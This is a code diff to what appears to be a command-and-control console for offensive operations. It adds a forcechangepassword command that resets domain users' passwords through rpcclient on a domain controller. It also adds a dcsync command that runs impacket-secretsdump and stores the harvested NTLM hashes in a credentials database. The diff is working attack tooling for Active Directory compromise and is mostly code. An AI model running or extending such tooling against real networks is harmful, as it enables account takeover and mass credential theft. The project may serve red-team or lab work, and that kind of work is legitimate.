@@ -46,6 +46,8 @@ Interact mode  (prompt changes to [agent_id] >):
   aclabuse genericwrite <target> <attr> <value>  — write an AD attribute (GenericWrite / GenericAll on object)
   aclabuse writedacl <target> <principal> <right>— grant an AD right to principal (WriteDacl on target)
   aclabuse writeowner <target> <new_owner>       — take ownership of an AD object (WriteOwner on target)
+  dcsync <domain/user:pass@target>               — server-side DCSync via impacket-secretsdump.
+                                                   NTLM hashes auto-stored in credentials DB.
   results                                        — show task results for this agent
   back                                           — return to global mode
 """
@@ -841,6 +843,45 @@ def handle_interact(line, agent_id):
                 if len(op_args) < required:
                     sig, _ = _ACLABUSE_USAGE[op]
                     print(f"[-] {op} requires {required} argument(s): {sig}")
+                elif op == "forcechangepassword":
+                    # Run server-side via rpcclient (SAMR level 23) — ADSI cannot
+                    # honour the ForceChangePassword ACE because it uses a different
+                    # SAMR info level that requires admin rights.
+                    if not altuser or not altpass:
+                        print("[-] forcechangepassword requires -u <user> -p <pass> (the account with GenericAll/ForceChangePassword)")
+                    else:
+                        target_user, newpass = op_args[0], op_args[1]
+                        # Find DC: first host with LDAP (389) open
+                        hosts = _get("/hosts") or []
+                        dc_ip = next(
+                            (h["ip"] for h in hosts
+                             if "389" in h.get("open_ports", "").split(",")),
+                            None
+                        )
+                        if not dc_ip:
+                            dc_ip = input("[?] DC IP not found in recon — enter manually: ").strip()
+                        # Infer domain from agent hostname (AGENT.DOMAIN.LOCAL → DOMAIN.LOCAL)
+                        agents = _get("/agents") or []
+                        domain = "ICCN.local"
+                        for a in agents:
+                            hn = a.get("hostname", "")
+                            if "." in hn:
+                                domain = ".".join(hn.split(".")[1:])
+                                break
+                        import subprocess
+                        cmd = [
+                            "rpcclient",
+                            f"-U{domain}/{altuser}%{altpass}",
+                            dc_ip,
+                            "-c", f"setuserinfo2 {target_user} 23 '{newpass}'"
+                        ]
+                        print(f"[*] ForceChangePassword via rpcclient → {dc_ip} as {altuser}")
+                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+                        combined = (result.stdout + result.stderr).strip()
+                        if result.returncode == 0 and "NT_STATUS" not in combined:
+                            print(f"[+] Password changed for {target_user}")
+                        else:
+                            print(f"[-] rpcclient failed: {combined}")
                 else:
                     parts = [op] + op_args
                     if altuser and altpass:
@@ -913,6 +954,41 @@ def handle_interact(line, agent_id):
             print("usage: spray <target_ip>")
         else:
             _do_spray(agent_id, arg.strip())
+
+    elif cmd == "dcsync":
+        if not arg:
+            print("usage: dcsync <domain/user:pass@target>")
+            print("  e.g. dcsync ICCN.local/svc_backup:Password@2026!@10.0.2.8")
+        else:
+            import subprocess, re
+            target_str = arg.strip()
+            print(f"[*] DCSync via impacket-secretsdump → {target_str}")
+            print("[*] Running...\n")
+            try:
+                result = subprocess.run(
+                    ["impacket-secretsdump", target_str],
+                    capture_output=True, text=True, timeout=120
+                )
+                output = result.stdout + result.stderr
+                print(output)
+                stored = 0
+                for ln in output.splitlines():
+                    m = re.match(r'^(?:[^\\:]+\\)?([^:]+):\d+:([a-f0-9]{32}):([a-f0-9]{32}):::', ln, re.I)
+                    if m:
+                        uname, lm, nt = m.group(1), m.group(2), m.group(3)
+                        _post("/credentials", {
+                            "username":    uname,
+                            "secret":      f"{lm}:{nt}",
+                            "cred_type":   "ntlm",
+                            "source_host": target_str.split("@")[-1],
+                        })
+                        stored += 1
+                if stored:
+                    print(f"[+] {stored} NTLM hash(es) stored in credentials DB")
+            except FileNotFoundError:
+                print("[-] impacket-secretsdump not found — install impacket")
+            except subprocess.TimeoutExpired:
+                print("[-] secretsdump timed out after 120s")
 
     elif cmd == "shell":
         command = arg if arg else ""
